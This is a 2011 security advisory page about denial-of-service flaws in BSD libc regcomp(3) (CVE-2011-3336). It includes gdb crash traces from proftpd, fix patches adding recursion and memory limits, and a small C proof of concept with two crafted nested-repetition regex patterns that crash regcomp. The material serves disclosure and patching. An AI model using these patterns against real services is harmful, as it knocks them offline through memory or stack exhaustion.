	
<!DOCTYPE html>
<HTML lang="en">
<HEAD>
<META http-equiv="Content-Type" content="text/html; charset=utf-8">
<TITLE>Multiple BSD libc/regcomp(3) Multiple Vulnerabilities - CXSecurity.com</TITLE>
<META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<META name="keywords" content="Multiple, BSD, libc/regcomp(3), Multiple, Vulnerabilities, exploit, vulnerability, bug, issue, advisories">
<META name="description" content="Maksymilian Arciemowicz has realised a new security note Multiple BSD libc/regcomp(3) Multiple Vulnerabilities ">
<META name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<META name="mobile-web-app-capable" content="yes">
<link rel="manifest" href="/manifest.json?b">
<LINK rel="Icon" href="https://cert.cx/cxstatic/favicon.ico" type="image/x-icon">
<script type="text/javascript" src="https://cert.cx/cxstatic/js/m-jq.js?T"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
<script type="text/javascript" src="https://cert.cx/cxstatic/js/m.js?V"></script>
<link href="https://cert.cx/cxstatic/css/b.css?G" rel="stylesheet" type='text/css'/>
</HEAD>
<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-39628967-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script><BODY ng-app="ui.bootstrap.demo">
<div class="navbar navbar-default navbar-fixed-top" id="frezz">
<div class="container"><div class="navbar-header"><a class="navbar-brand" href="https://cxsecurity.com/"><IMG SRC="https://cert.cx/cxstatic/images/12018/cxseci.png" width="150" height="20" ALT="Home Page"></a><button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button></div><div class="navbar-collapse collapse" id="navbar-main" ><ul class="nav navbar-nav">
          <li><a href="https://cxsecurity.com/">Home</a></li><li class="active">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Bugtraq<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/wlb/">Full List</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/bugs/">Only Bugs</a></li>
<li><a href="https://cxsecurity.com/tricks/">Only Tricks</a></li>
<li><a href="https://cxsecurity.com/exploit/">Only Exploits</a></li>
<li><a href="https://cxsecurity.com/dorks/">Only Dorks</a></li>
<li><a href="https://cxsecurity.com/cvelist/">Only CVE</a></li>
<li><a href="https://cxsecurity.com/cwelist/">Only CWE</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/bogus/">Fake Notes</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/best/1/">Ranking</a></li>

</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">CVEMAP<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/cvemap/">Full List</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cvevendors/">Show Vendors</a></li>
<li><a href="https://cxsecurity.com/cveproducts/">Show Products</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/allcwe/">CWE Dictionary</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cve/">Check CVE Id </a></li>
<li><a href="https://cxsecurity.com/cwe/">Check CWE Id</a></li>
</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Search<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/search/">Bugtraq</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/search/cve/">CVEMAP</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/search/author/">By author</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cve/">CVE Id</a></li>
<li><a href="https://cxsecurity.com/cwe/">CWE Id</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cvevendors/">By vendors</a></li>
<li><a href="https://cxsecurity.com/cveproducts/">By products</a></li>
</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">RSS<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/wlb/rss/all/">Bugtraq</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cverss/fullmap/">CVEMAP</a></li>
<li><a href="https://cxsecurity.com/cveproducts/">CVE Products</a></li>
    <li class="divider"></li>
<li><a href="https://cxsecurity.com/wlb/rss/vulnerabilities/">Bugs</a></li>
<li><a href="https://cxsecurity.com/wlb/rss/exploit/">Exploits</a></li>
<li><a href="https://cxsecurity.com/wlb/rss/dorks/">Dorks</a></li>
</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">More<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="http://cifrex.org/">cIFrex</a></li>
<li class="divider"></li>
<li><a href="https://www.facebook.com/cxsec">Facebook</a></li>
<li><a href="https://twitter.com/cxsecurity">Twitter</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/donate/">Donate</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/wlb/about/">About</a></li>
</ul></li>
</ul>
<ul class="nav navbar-nav navbar-right">
<li><a href="https://cxsecurity.com/wlb/add/">Submit</a></li>
</ul></div></div></div>
<div id="general"><TABLE width="100%"><TR><TD width="6%"></TD><TD id="boki"></TD><TD id='glowna'><CENTER>
<script src="https://www.google.com/recaptcha/api.js?onload=CaptchaCallback&render=explicit" async defer></script>
<script type="text/javascript">
        var CaptchaCallback = function() {
            var recap1 = grecaptcha.render('Recaptcha1', {'sitekey' : '6LfbQCQTAAAAANKENerevt305dDl_nywcNEn91q6', 'theme' : 'dark', 'callback' : 'setComIt'});
            var recap2 = grecaptcha.render('Recaptcha2', {'sitekey' : '6LfbQCQTAAAAANKENerevt305dDl_nywcNEn91q6', 'theme' : 'dark', 'callback' : 'onSubmit'});
        };
    </script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/angular-sanitize/1.6.6/angular-sanitize.min.js"></script>
<script type="text/javascript" src="https://cxsecurity.com/js/show.js"></script>
<TABLE cellpadding="0" cellspacing="0" width="100%"><TR><TD>
<DIV ng-non-bindable><CENTER><h4><B>Multiple BSD libc/regcomp(3) Multiple Vulnerabilities</B></h4>
<div class="panel panel-default""><div class="panel-body"><div class="container"><div class="row">
<div class="col-xs-12 col-md-3"><div class="well well-sm"><b>2011.11.04</b></div></div>
<div class="col-xs-12 col-md-6"><div class="well well-sm"><U>Credit:</U> <b> <A HREF="https://cxsecurity.com/author/Maksymilian+Arciemowicz/1/">Maksymilian Arciemowicz</a>  </b>
</div></div><div class="col-xs-5 col-md-3"><div class="well well-sm">
  <U>Risk:</U> <b>
<span class="label label-danger">High</span></b>
</div></div><div class="col-xs-3 col-md-3"><div class="well well-sm">
  <U>Local:</U> <b><B>Yes</B></span></b>
</div></div><div class="col-xs-4 col-md-3"><div class="well well-sm">
  <U>Remote:</U> <b><B>Yes</B></span></b>
</div></div><div class="col-xs-6 col-md-3"><div class="well well-sm">
  <U>CVE:</U> <b><A href="https://cxsecurity.com/cveshow/CVE-2011-3336/" title="Click to see CVE-2011-3336" style="text-decoration: none;">CVE-2011-3336</A></b>
</div></div><div class="col-xs-6 col-md-3"><div class="well well-sm">
  <U>CWE:</U> <b><A href="https://cxsecurity.com/cwe/CWE-400" title="CWE-400" style="text-decoration: none;">CWE-400</A> </b></div></div></div><P><TABLE width="70%"><TR><TD><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-5074670963595353"
     data-ad-slot="9692700437"
     data-full-width-responsive="true"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></TD></TR>
</TABLE><P><BR><div class="well well-sm"><div class="container">
<div class="row">
<div class="col-xs-6 col-md-4 nopadding">
CVSS Base Score: <font color="#b2b2b2"><b>7.8/10</b></font>
</div><div class="col-xs-6 col-md-4 nopadding">
Impact Subscore: <font color="#b2b2b2"><b>6.9/10</b></font>
</div><div class="col-xs-6 col-md-4 nopadding">
Exploitability Subscore: <font color="#b2b2b2"><b>10/10</b></font>
</div><div class="col-xs-6 col-md-4 nopadding">
Exploit range: <font color="#b2b2b2"><b>Remote</b></font>
</div><div class="col-xs-6 col-md-4 nopadding">
Attack complexity: <font color="#b2b2b2"><b>Low</b></font>
</div><div class="col-xs-6 col-md-4 nopadding">
Authentication: <font color="#b2b2b2"><b>No required</b></font>
</div><div class="col-xs-6 col-md-4 nopadding">
Confidentiality impact: <font color="#b2b2b2"><b>None</b></font>
</div><div class="col-xs-6 col-md-4 nopadding">
Integrity impact: <font color="#b2b2b2"><b>None</b></font>
</div><div class="col-xs-6 col-md-4 nopadding">
Availability impact: <font color="#b2b2b2"><b>Complete</b></font>
</div></div></div></CENTER></div></div></div><P><DIV style="white-space: pre-wrap; word-break: break-all;" ng-non-bindable><div class="well well-sm premex">[ Multiple BSD libc/regcomp(3) Multiple Vulnerabilities ]

Author: Maksymilian Arciemowicz
http://www.netbsd.org/donations/
http://cxib.net/

Date:
- Dis.: 05.10.2011
- Pub.: 04.11.2011

CVE: CVE-2011-3336

Affected Software:
- NetBSD 5.1 (fixed)
- OpenBSD 5.0
- FreeBSD 8.2
- MacOSX


--- 0.Description ---
regcomp() compiles the regular expression contained in the pattern string, subject to the flags in cflags, and places the results in the regex_t structure pointed to by preg.

cflags is the bitwise OR of zero or more of the following flags:

REG_EXTENDED  
Compile modern (extended) REs, rather than the obsolete (basic) REs that are the default.

REG_BASIC
This is a synonym for 0, provided as a counterpart to REG_EXTENDED to improve readability.


--- 1.  Multiple BSD libc/regcomp(3) Multiple Vulnerabilities ---
In regcomp(3) of BSD implementation, i&#039;ve discovered a several flaws. Similar problem was diagnosed one year ago in GNU libc (01.10.2010). But GNU regcomp() code is different from BSD.

Recursion and bad memory managment, may admit to unexpected end of application. Together with NetBSD we have decided to fix all these flaws. Most important was limit of recursion for REG_EXTENDED and REG_BASIC, and get better control over memory usage. 

Specifically crafted .ftpaccess file can return result as below
-proftpd---
# telnet 127.0.0.1 21 
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is &#039;^]&#039;.
220 ProFTPD 1.3.3f Server (ProFTPD Default Installation) [127.0.0.1]
user dude
331 Password required for dude
pass dude

and in the same time

# gdb -q proftpd 15814
(no debugging symbols found)
Attaching to program: /usr/local/sbin/proftpd, process 15814
Reading symbols from /usr/lib/libutil.so.11.2...done.
Loaded symbols for /usr/lib/libutil.so.11.2
Reading symbols from /usr/lib/libc.so.58.0...done.
Loaded symbols for /usr/lib/libc.so.58.0
Reading symbols from /usr/libexec/ld.so...done.
Loaded symbols for /usr/libexec/ld.so
0x001f39e9 in select () from /usr/lib/libc.so.58.0
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0026d951 in memcpy () from /usr/lib/libc.so.58.0

crash in regcomp()

...
	assert(finish &gt;= start);
	if (len == 0)
		return(ret);
	enlarge(p, p-&gt;ssize + len);	/* this many unexpected additions */
	assert(p-&gt;ssize &gt;= p-&gt;slen + len);
	(void)memcpy(p-&gt;strip + p-&gt;slen, p-&gt;strip + start,
	    (size_t)len * sizeof(sop));
...
(gdb) x/i $eip
0x2d42951 &lt;memcpy+61&gt;:  repz movsl %ds:(%esi),%es:(%edi)
...
-proftpd---


Uncontrolled memory exhaustion, allow to create an RE consuming all free memory. As we can read in manual:

-man regcomp 3--
regexec() performance is poor.  This will improve with later releases. nmatch exceeding 0 is expensive; nmatch exceeding 1 is worse.
regexec is largely insensitive to RE complexity except that back references are massively expensive.  RE length does matter; in particular, there is a strong speed bonus for keeping RE length under about 30 characters, with most special characters counting roughly double.

regcomp() implements bounded repetitions by macro expansion, which is costly in time and space if counts are large or bounded repetitions are nested.  An RE like, say, `((((a{1,100}){1,100}){1,100}){1,100}){1,100}&#039; will (eventually) run almost any existing machine out of swap space.
-man regcomp 3--

Using RE like `((((a{1,100}){1,100}){1,100}){1,100}){1,100}&#039; may lead to out of swap space. It can be helpful to attack last stable version of proftpd. 

To fix memory exhaustion problem, we should create some limit of memory usage. In my opinion 128MB is optimal limit for one regcomp(3) call. Then function, checking memory usage like below

-part-of-fix--
214: #define        MEMLIMIT        0x8000000
215: #define MEMSIZE(p) \
216:        ((p)-&gt;ncsalloc / CHAR_BIT * (p)-&gt;g-&gt;csetsize + \
217:        (p)-&gt;ncsalloc * sizeof(cset) + \
218:        (p)-&gt;ssize * sizeof(sop))
219: #define        RECLIMIT        256
-part-of-fix--

should solve problem with memory exhaustion.

In regcomp() we have a few recursion loops:
- p_ere &lt;&gt; p_ere_exp
- p_bre &lt;&gt; p_bre_exp
- repeat

We need to create a limit for the two main functions p_ere and p_bre_exp

#define	RECLIMIT	256

-REG_EXTENTED---
341: p_ere(
342:     struct parse *p,
343:     int stop,                  /* character this ERE should end at */
344:     size_t reclimit)
345: {
...
351:
352:        _DIAGASSERT(p != NULL);
353:
354:        if (reclimit++ &gt; RECLIMIT || p-&gt;error == REG_ESPACE) {
355:                p-&gt;error = REG_ESPACE;
356:                return;
357:        }
358:
359:        for (;;) {
360:                /* do a bunch of concatenated expressions */
361:                conc = HERE();
362:                while (MORE() &amp;&amp; (c = PEEK()) != &#039;|&#039; &amp;&amp; c != stop)
363:                        p_ere_exp(p, reclimit); &lt;=== RECURSION p_ere_exp &lt;&gt; p_ere
...
394: static void
395: p_ere_exp(
396:     struct parse *p,
397:     size_t reclimit)
398: {
...
420:                if (!SEE(&#039;)&#039;))
421:                        p_ere(p, &#039;)&#039;, reclimit); &lt;=== RECURSION p_ere &lt;&gt; p_ere_exp
...
-REG_EXTENTED---

and adding code like:

+	if (reclimit++ &gt; RECLIMIT) 
+		p-&gt;error = REG_ESPACE;
+	if (p-&gt;error)
 		return;

should protect us before huge complexity for REG_EXTENTED and REG_BASIC. 

The same limit implements to p_bre:
-REG_BASIC---
...
570: static void
571: p_bre(
572:     struct parse *p,
573:     int end1,          /* first terminating character */
574:     int end2,          /* second terminating character */
575:     size_t reclimit)
576: {
577:        sopno start;
578:        int first = 1;                  /* first subexpression? */
579:        int wasdollar = 0;
580:
581:        _DIAGASSERT(p != NULL);
582:
583:        if (reclimit++ &gt; RECLIMIT || p-&gt;error == REG_ESPACE) {
584:                p-&gt;error = REG_ESPACE;
585:                return;
586:        }
587:
...
595:        while (MORE() &amp;&amp; !SEETWO(end1, end2)) {
596:                wasdollar = p_simp_re(p, first, reclimit); &lt;=== RECURSION p_bre_exp &lt;&gt; p_bre
597:                first = 0;
...
613: static int                     /* was the simple RE an unbackslashed $? */
614: p_simp_re(
615:     struct parse *p,
616:     int starordinary,          /* is a leading * an ordinary character? */
617:     size_t reclimit)
618: {
...
650:        case BACKSL|&#039;(&#039;:
651:                p-&gt;g-&gt;nsub++;
652:                subno = p-&gt;g-&gt;nsub;
653:                if (subno &lt; NPAREN)
654:                        p-&gt;pbegin[subno] = HERE();
655:                EMIT(OLPAREN, subno);
656:                /* the MORE here is an error heuristic */
657:                if (MORE() &amp;&amp; !SEETWO(&#039;\\&#039;, &#039;)&#039;))
658:                        p_bre(p, &#039;\\&#039;, &#039;)&#039;, reclimit); &lt;=== RECURSION p_bre &lt;&gt; p_bre_exp
...
-REG_BASIC---

That all about fixes.

For REs like 

&quot;(\(\(\(\(\(\(\(\(...)&quot;
&quot;(((...(.*))))&quot;

regcomp() should crash with stack exhaustion symptom

This bug has been used to denial of service proftpd 1.3.3f in openbsd 4.9 and netbsd 5.1. Similar problem has been reported in GNU libc. Anyway Redhat has decided to not solve the problem:
---
Statement:

Red Hat does not consider crash of client application, using regcomp() 
or regexec() routines on untrusted input without preliminary checking 
the input for the sanity, to be a security issue (the described deficiency 
implies and is a known limitation of the glibc regular expression engine 
implementation). The expressions can be modified to avoid quantification 
nesting, or program modified to limit size of input passed to regular 
expression engine. We do not currently plan to fix these flaws. If more 
information becomes available at a future date, we may revisit these issues.
---

regcomp() is not only used in client application. proftpd uses regcomp() in .ftpaccess file. Now we should know, who has right? Red Hat or proftpd has made a mistake using regcomp() in code? GNU need more information to revisit this issue :)


--- 2. PoC ---
/* poc.c

pattern1:
./poc &#039;(.?)((((.*){1,100}){1,100}){1,100}){1,100}&#039; 

pattern2:
./poc &#039;(.?)(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((.*){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}&#039;
Memory fault (core dumped) 
gdb openbsd 4.9:
1275            (void) memcpy((char *)(p-&gt;strip + p-&gt;slen),
(gdb) print p-&gt;slen
$14 = 218103912
(gdb) print start  
$15 = 107
(gdb) print len  
$16 = 218103802
(gdb) x/x p-&gt;slen
0xd000068:      Cannot access memory at address 0xd000068
(gdb) n

Program received signal SIGSEGV, Segmentation fault.
0x02d42951 in memcpy () from /usr/lib/libc.so.58.0
(gdb) x/i $eip
0x2d42951 &lt;memcpy+61&gt;:  repz movsl %ds:(%esi),%es:(%edi)
(gdb) x/x $esi
0xbf3ce190:     0x70000064
(gdb) x/x $edi
0xf33ce184:     Cannot access memory at address 0xf33ce184


and more patterns from
http://cvsweb.netbsd.org/bsdweb.cgi/src/tests/lib/libc/regex/t_exhaust.c

*/
#include &lt;regex.h&gt;
#include &lt;stdio.h&gt;

int
main (int argc, char *argv[])
{
	regex_t preg;
	int a=regcomp(&amp;preg, argv[1], REG_EXTENDED);
	printf(&quot;a:%i\n&quot;,a);
	return 0;
}


--- 3. Fix ---
http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/regex/regcomp.c
http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/regex/engine.c
http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/regex/regex2.h

tests:
http://cvsweb.netbsd.org/bsdweb.cgi/src/tests/lib/libc/regex/Makefile
http://cvsweb.netbsd.org/bsdweb.cgi/src/tests/lib/libc/regex/t_exhaust.c


--- 4. References ---
GNU/regcomp() vulnerability
http://www.kb.cert.org/vuls/id/912279
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4051
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4052

Statement:
https://bugzilla.redhat.com/show_bug.cgi?id=645859#c6

Exploit:
tested: ubuntu 11.10 and proftpd 1.3.4rc2
http://cxib.net/stuff/proftpd.gnu.c


--- 5. Greets ---
Christos Zoulas

and thanks for US-CERT for coordinating


--- 6. Contact ---
Author: Maksymilian Arciemowicz

</DIV></P><P class="txt" id="refer"></P></DIV><div class="panel panel-default"">
 <div class="panel-body"><div class="well well-sm"><b><h5><U>References:</U></h5></b><P class="txt"><DIV ng-non-bindable> <DIV STYLE="text-decoration:none;color:#f4f4f4;target-new: tab;" onclick="window.open('http://cxib.net/stuff/proftpd.gnu.c', '_blank')" onmouseover="this.style.textDecoration ='underline';this.style.cursor='pointer';" onmouseout="this.style.textDecoration='none';">http://cxib.net/stuff/proftpd.gnu.c</DIV>
<DIV STYLE="text-decoration:none;color:#f4f4f4;target-new: tab;" onclick="window.open('http://www.kb.cert.org/vuls/id/912279', '_blank')" onmouseover="this.style.textDecoration ='underline';this.style.cursor='pointer';" onmouseout="this.style.textDecoration='none';">http://www.kb.cert.org/vuls/id/912279</DIV>
<DIV STYLE="text-decoration:none;color:#f4f4f4;target-new: tab;" onclick="window.open('http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4051', '_blank')" onmouseover="this.style.textDecoration ='underline';this.style.cursor='pointer';" onmouseout="this.style.textDecoration='none';">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4051</DIV>
<DIV STYLE="text-decoration:none;color:#f4f4f4;target-new: tab;" onclick="window.open('http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4052', '_blank')" onmouseover="this.style.textDecoration ='underline';this.style.cursor='pointer';" onmouseout="this.style.textDecoration='none';">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4052</DIV>
<DIV STYLE="text-decoration:none;color:#f4f4f4;target-new: tab;" onclick="window.open('https://bugzilla.redhat.com/show_bug.cgi?id=645859#c6', '_blank')" onmouseover="this.style.textDecoration ='underline';this.style.cursor='pointer';" onmouseout="this.style.textDecoration='none';">https://bugzilla.redhat.com/show_bug.cgi?id=645859#c6</DIV>
<DIV STYLE="text-decoration:none;color:#f4f4f4;target-new: tab;" onclick="window.open('http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/regex/regcomp.c', '_blank')" onmouseover="this.style.textDecoration ='underline';this.style.cursor='pointer';" onmouseout="this.style.textDecoration='none';">http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/regex/regcomp.c</DIV>
<DIV STYLE="text-decoration:none;color:#f4f4f4;target-new: tab;" onclick="window.open('http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/regex/engine.c', '_blank')" onmouseover="this.style.textDecoration ='underline';this.style.cursor='pointer';" onmouseout="this.style.textDecoration='none';">http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/regex/engine.c</DIV>
<DIV STYLE="text-decoration:none;color:#f4f4f4;target-new: tab;" onclick="window.open('http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/regex/regex2.h', '_blank')" onmouseover="this.style.textDecoration ='underline';this.style.cursor='pointer';" onmouseout="this.style.textDecoration='none';">http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/regex/regex2.h</DIV>
<DIV STYLE="text-decoration:none;color:#f4f4f4;target-new: tab;" onclick="window.open('http://cvsweb.netbsd.org/bsdweb.cgi/src/tests/lib/libc/regex/Makefile', '_blank')" onmouseover="this.style.textDecoration ='underline';this.style.cursor='pointer';" onmouseout="this.style.textDecoration='none';">http://cvsweb.netbsd.org/bsdweb.cgi/src/tests/lib/libc/regex/Makefile</DIV>
<DIV STYLE="text-decoration:none;color:#f4f4f4;target-new: tab;" onclick="window.open('http://cvsweb.netbsd.org/bsdweb.cgi/src/tests/lib/libc/regex/t_exhaust.c', '_blank')" onmouseover="this.style.textDecoration ='underline';this.style.cursor='pointer';" onmouseout="this.style.textDecoration='none';">http://cvsweb.netbsd.org/bsdweb.cgi/src/tests/lib/libc/regex/t_exhaust.c</DIV>
</DIV><BR></div><CENTER>
<TABLE width="75%"><TR><TD><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-5074670963595353"
     data-ad-slot="6599633238"
     data-full-width-responsive="true"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></TD></TR></TABLE><BR>
<div class="container"><div class="row">
<div class="col-xs-12 col-md-6"><div class="well well-sm">
<CENTER><A HREF="https://cxsecurity.com/ascii/WLB-2011110082"><FONT SIZE="4"><b>See this note in RAW Version</b></FONT></A></CENTER></div></div>
<div class="col-xs-6 col-md-3"><div class="well well-sm">
<a href="https://twitter.com/share" class="twitter-share-button" data-count="none">Tweet</a>
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script></div></div>
<div class="col-xs-6 col-md-3"><div class="well well-sm">
<div id="fb-root"></div>
<script>(function(d, s, id) {
var js, fjs = d.getElementsByTagName(s)[0];
if (d.getElementById(id)) return;
js = d.createElement(s); js.id = id;
js.src = "//connect.facebook.net/pl_PL/sdk.js#xfbml=1&version=v2.3";
fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="fb-like" data-href="https://cxsecurity.com/issue/WLB-2011110082" data-width="50" data-layout="button" data-action="like" data-show-faces="false" data-share="false"></div></div></div>
<div class="col-xs-12 col-md-12"><div class="well well-sm">
<div class="container">
<div class="group-form inline">
<div class="col-sm-12 col-md-6" valign="middle">
Vote for this issue:
<input type="hidden" id="numberWlb" value="2011110082">
<button type="button" id="dodatnie" class="btn btn-success glyphicon glyphicon-thumbs-up" data-loading-text=" ... "  data-toggle="collapse" data-target="#voteCaptcha" onClick="setPositive()" onLoad="alreV()" value="0">         0</button>
<button type="button" id="ujemne" class="btn btn-danger glyphicon glyphicon-thumbs-down" data-loading-text=" ... " data-toggle="collapse" data-target="#voteCaptcha"  onClick="setNegative()" value="0">       0</button>
</div>
<div class="col-sm-11 col-md-5" valign="middle" id="barr">
<div class="progress progress-striped" style="margin-top: 11px;" >
<div class="progress-bar progress-bar-success active" id="dodatnieBar" data-toggle="collapse" data-target="#voteCaptcha" onClick="setPositive()" onLoad="alreV()" style="width: 50%"><div id="valGreBar">50%</div></div>
<div class="progress-bar progress-bar-danger active" id="ujemneBar" class="btn btn-danger glyphicon glyphicon-thumbs-down" data-loading-text=" ... " data-toggle="collapse" data-target="#voteCaptcha"  onClick="setNegative()" style="width: 50%"><div id="valRedBar">50%</div></div>
</div></div></div></div>
<div id="voteCaptcha" class="collapse">
<BR><div class="g-recaptcha" id="Recaptcha2"></div>
</div>
<div id="thanksVote">
<BR>&nbsp;<BR><div class="alert alert-success" style="background-color: #556B2F;">
<h4><strong>Thanks for you vote!</strong></h4></div>
</div>
<div id="thanksComm">
<BR>&nbsp;<BR><div class="alert alert-success" style="background-color: #556B2F;">
<h4><strong>Thanks for you comment!</strong><br>Your message is in quarantine 48 hours.</h4></div>
</div></CENTER></div></div></div>
<div id="cWlb">
<div class="well well-sm"><input name="wlb" value="2011110082" type="hidden">
<fieldset>
<legend>Comment it here.</legend>
<div class="form-group form-horizontal">
<label for="inputNick" class="col-lg-1 control-label">Nick (*)</label>
<div class="col-lg-11"><input name="n" class="form-control" id="inputNick" placeholder="Nick" style="background-color: black;" onchange="document.getElementById('commCaptcha').style.display='block';"></div></div>
<div class="form-group form-horizontal">
<label for="inputEmail" class="col-lg-1 control-label">Email (*)</label>
<div class="col-lg-11"><input name="e" class="form-control" id="inputEmail" placeholder="Email" style="background-color: black;"></div></div>
<div class="form-group form-horizontal">
<label for="inputYoutube" class="col-lg-1 control-label">Video </label>
<div class="col-lg-11"><input name="v" class="form-control" id="inputVideo" placeholder="Link to Youtube" style="background-color: black;"></div></div>
<div class="form-group form-horizontal">
<label for="textArea" class="col-lg-1 control-label">Text (*)</label>
<div class="col-lg-11">
<textarea name="c" class="form-control" rows="6" id="inputComment" style="background-color: black;"></textarea></div></div>
<div class="form-group form-horizontal">
<div class="col-lg-12" id="commCaptcha" class="collapse"><BR>
<CENTER><div id="Recaptcha1"></div><BR>
<small>(*) - <cite title="requi">required fields. </cite></small> &nbsp;
<button type="reset" class="btn btn-default" style="background-color: transparent; margin-left: 0px; margin-right: 0px;">Cancel</button>
<button type="submit" id="wysl"  style="background-color: black; margin-left: 0px; margin-right: 0px;" class="btn btn-default" onclick="comIt()">Submit</button>
</CENTER>
</div></div></fieldset></div></div>
<div ng-app="ui.bootstrap.demo" ng-controller="myCtrl">
<div ng-repeat="x in comments">
<div class="well well-sm">
<table width="100%"><TR><TD width="7%"><div ng-bind-html="x.video"></div></TD><TD style="max-width: 100%;overflow: visible;"><div align="left" class="breakcx" id="breakcx"><U><b>{{ x.nick }}</b></U> <img width="20" height="14" ng-src="https://cxsecurity.com/images/flags/{{ x.country }}.png"> | <U>Date:</U> {{ x.ux  * 1000 | date:'yyyy-MM-dd' }} <I>{{ x.ux  * 1000 | date:'HH:mm' }}</I> CET+1<HR style="padding: 0px; margin: 5px;"><DIV style="white-space: pre-wrap;">{{ x.comment }}</DIV>
</div>
</TD></TR></table>
</div>
</div><button type="button" id="shomor" class="btn btn-link btn-block" ng-click="getNextCom()">Show all comments</button></div></div></div></CENTER>
</TD></TR></TABLE>
<script>
$("#thanksComm").hide(); $("#cWLb").hide(); $("#thanksVote").hide(); $("#commCaptcha").hide();
if (localStorage.vote2011110082==1) {             
